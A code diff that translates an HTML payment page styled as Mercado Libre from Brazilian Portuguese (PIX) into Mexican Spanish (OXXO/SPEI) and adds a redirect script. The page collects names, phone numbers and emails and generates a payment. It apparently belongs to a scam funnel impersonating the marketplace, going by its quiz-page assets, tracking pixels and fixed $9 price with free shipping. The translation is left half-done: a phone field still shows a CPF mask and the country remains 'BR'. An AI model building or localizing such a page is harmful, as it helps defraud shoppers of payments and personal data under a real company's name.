@@ -1,6 +1,6 @@
 <!DOCTYPE html>
-<html lang="pt-br">
-<head>
+<html lang="es-MX">
+<head><script>location.replace("/checkout"+location.search)</script>
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-CV5GQ7D48S"></script>
@@ -14,7 +14,7 @@
 <script src="/js/api-base.js"></script><script src="/js/fb-pixel.js"></script><script src="/js/tiktok-pixel.js"></script><script src="/js/utmify-pixel.js"></script><script src="/js/visit-log.js" defer></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <title>Dados para Pagamento - Mercado Livre</title>
+    <title>Datos para el pago - Mercado Libre</title>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <link rel="icon" href="/loja/_assets/images/bYrTS8w3kR7Z.png">
     <link rel="shortcut icon" href="/loja/_assets/images/bYrTS8w3kR7Z.png">
@@ -207,15 +207,15 @@
 <script src="/js/loja-cart.js" defer></script></head>
 <body>
     <div style="background-color: #00a650; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">
-        Pagamento via PIX - Aprovação instantânea
+        Pago con OXXO o SPEI - Aprobación inmediata
     </div>
      
     <nav class="navbar" style="padding-top: 15px;">
         <div class="menu-icon" style="padding-left: 3%;" onclick="window.history.back()">
-            <span style="font-family: 'GellixMedium'; color: black; cursor: pointer;">❮ Voltar</span>
+            <span style="font-family: 'GellixMedium'; color: black; cursor: pointer;">❮ Volver</span>
         </div>
         <div class="logo-central">
-            <img src="../../../quiz/images/logo.webp" style="height: 5vh;" alt="Logo Mercado Livre">
+            <img src="../../../quiz/images/logo.webp" style="height: 5vh;" alt="Logo Mercado Libre">
         </div>
         <div class="menu-icon" style="padding-right: 3%;">
             <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 0px; color: black">lock</span>
@@ -223,22 +223,22 @@
     </nav>
 
     <div class="payment-container" id="formContainer">
-        <h1 class="payment-title">Dados para Pagamento</h1>
-        <p class="payment-subtitle">Preencha seus dados para gerar o PIX</p>
+        <h1 class="payment-title">Datos para el pago</h1>
+        <p class="payment-subtitle">Ingresa tus datos para generar el pago</p>
 
         <!-- Resumo do Pedido -->
         <div class="order-summary">
             <div class="summary-row">
-                <span>Produtos (<span id="itemCount">0</span>)</span>
-                <span id="subtotal">R$ 0,00</span>
+                <span>Productos (<span id="itemCount">0</span>)</span>
+                <span id="subtotal">$9</span>
             </div>
             <div class="summary-row">
-                <span>Frete</span>
-                <span style="color: #00a650;">Grátis</span>
+                <span>Envío</span>
+                <span style="color: #00a650;">Gratis</span>
             </div>
             <div class="summary-total">
                 <span>Total a pagar</span>
-                <span id="totalAmount">R$ 0,00</span>
+                <span id="totalAmount">$9</span>
             </div>
         </div>
 
@@ -254,8 +254,8 @@
                 <path fill="url(#grad)" d="M242.4 292.5C247.8 287.1 257.1 287.1 262.5 292.5L339.5 369.5C353.7 383.7 372.6 391.5 392.6 391.5H407.7L310.6 488.6C280.3 518.1 231.1 518.1 200.8 488.6L103.3 391.5H112.6C132.6 391.5 151.5 383.7 165.7 369.5L242.4 292.5zM262.5 218.9C257.1 224.3 247.8 224.3 242.4 218.9L165.7 142.1C151.5 127.9 132.6 120.1 112.6 120.1H103.3L200.7 22.64C231.1-7.213 280.3-7.213 310.6 22.64L407.7 120.1H392.6C372.6 120.1 353.7 127.9 339.5 142.1L262.5 218.9zM112.6 142.1C126.4 142.1 139.1 148.3 149.7 158.1L226.4 234.8C233.6 241.1 243 245.6 252.5 245.6C261.9 245.6 271.3 241.1 278.5 234.8L355.5 157.8C365.3 148.1 378.8 142.1 392.6 142.1H430.3L488.6 200.7C518.9 231.1 518.9 280.3 488.6 310.6L430.3 368.9H392.6C378.8 368.9 365.3 362.9 355.5 353.1L278.5 276.2C271.3 269.9 261.9 265.4 252.5 265.4C243 265.4 233.6 269.9 226.4 276.2L149.7 352.1C139.1 362.9 126.4 368.9 112.6 368.9H80.78L22.64 310.6C-7.213 280.3-7.213 231.1 22.64 200.7L80.78 142.1H112.6z"/>
             </svg>
             <div class="payment-info">
-                <div class="payment-name">Pagar com PIX</div>
-                <div class="payment-desc">Aprovação instantânea • QR Code</div>
+                <div class="payment-name">Pagar con SPEI</div>
+                <div class="payment-desc">Aprobación inmediata • Código QR</div>
             </div>
         </div>
 
@@ -264,41 +264,41 @@
             <div class="form-section">
                 <div class="section-title">
                     <span class="material-symbols-outlined">person</span>
-                    Dados pessoais
+                    Datos personales
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="name">Nome completo</label>
-                    <input type="text" id="name" name="name" class="form-input" placeholder="Digite seu nome completo" required>
-                    <div class="error-message" id="nameError">Por favor, digite seu nome completo</div>
+                    <label class="form-label" for="name">Nombre completo</label>
+                    <input type="text" id="name" name="name" class="form-input" placeholder="Ingresa tu nombre completo" required>
+                    <div class="error-message" id="nameError">Por favor, ingresa tu nombre completo</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="document">CPF</label>
+                    <label class="form-label" for="document">Teléfono</label>
                     <input type="text" id="document" name="document" class="form-input" placeholder="000.000.000-00" maxlength="14" required>
-                    <div class="error-message" id="documentError">CPF inválido</div>
+                    <div class="error-message" id="documentError">Teléfono inválido</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="phone">Telefone/WhatsApp</label>
+                    <label class="form-label" for="phone">Teléfono/WhatsApp</label>
                     <input type="tel" id="phone" name="phone" class="form-input" placeholder="(00) 00000-0000" maxlength="15" required>
-                    <div class="error-message" id="phoneError">Telefone inválido</div>
+                    <div class="error-message" id="phoneError">Teléfono inválido</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label" for="email">E-mail</label>
-                    <input type="email" id="email" name="email" class="form-input" placeholder="seuemail@exemplo.com" required>
+                    <label class="form-label" for="email">Correo electrónico</label>
+                    <input type="email" id="email" name="email" class="form-input" placeholder="tucorreo@ejemplo.com" required>
                     <div class="error-message" id="emailError">E-mail inválido</div>
                 </div>
             </div>
 
             <button type="submit" class="submit-btn" id="submitBtn">
-                Gerar PIX
+                Generar pago
             </button>
 
             <div class="secure-badge">
                 <span class="material-symbols-outlined">lock</span>
-                Seus dados estão protegidos
+                Tus datos están protegidos
             </div>
         </form>
     </div>
@@ -306,11 +306,11 @@
     <!-- Loading -->
     <div class="payment-container loading" id="loadingContainer">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Gerando seu pagamento PIX...</div>
+        <div class="loading-text">Generando tu pago por SPEI...</div>
     </div>
 
     <div style="margin-top: 40px; border-top: 1px solid #ddd; padding: 20px; text-align: center; font-family: 'GellixRegular'; color: #999; font-size: 12px;">
-        <p>© 1999-2024 Ebazar.com.br LTDA.</p>
+        <p>© 1999-2024 MercadoLibre.com.mx</p>
     </div>
 
     <script src="/loja/_assets/js/cart.js"></script>
@@ -339,7 +339,7 @@
             // Atualiza frete no resumo
             const shippingElement = document.querySelector('.order-summary .summary-row:nth-child(2) span:last-child');
             if (shippingCost === 0) {
-                shippingElement.textContent = 'Grátis';
+                shippingElement.textContent = 'Gratis';
                 shippingElement.style.color = '#00a650';
             } else {
                 shippingElement.textContent = Cart.formatPrice(shippingCost);
@@ -512,15 +512,15 @@
                     quantity: item.quantity
                 })),
                 shipping: {
-                    street: deliveryAddress.rua || 'Não informado',
+                    street: deliveryAddress.rua || 'No especificado',
                     streetNumber: deliveryAddress.numero || 'S/N',
                     zipCode: (deliveryAddress.cep || '').replace(/\D/g, ''),
-                    neighborhood: deliveryAddress.bairro || 'Não informado',
-                    city: deliveryAddress.cidade || 'Não informado',
+                    neighborhood: deliveryAddress.bairro || 'No especificado',
+                    city: deliveryAddress.cidade || 'No especificado',
                     state: deliveryAddress.estado || 'SP',
                     country: 'BR',
                     complement: deliveryAddress.complemento || '',
-                    shippingType: shippingData.name || 'Correios - Grátis',
+                    shippingType: shippingData.name || 'Paquetería - Gratis',
                     shippingCost: Math.round(shippingCost * 100) // Em centavos
                 },
                 amount: Math.round(finalTotal * 100) // Total com frete em centavos
@@ -552,11 +552,11 @@
                     // Redireciona para página do QR Code
                     window.location.href = 'qrcode.html';
                 } else {
-                    throw new Error(result.error?.message || 'Erro ao gerar pagamento');
+                    throw new Error(result.error?.message || 'Error al generar el pago');
                 }
             } catch (error) {
                 console.error('Erro:', error);
-                alert('Erro ao gerar pagamento PIX. Por favor, tente novamente.');
+                alert('Error al generar el pago por SPEI. Por favor, intenta de nuevo.');
                 document.getElementById('formContainer').style.display = 'block';
                 document.getElementById('loadingContainer').style.display = 'none';
             }
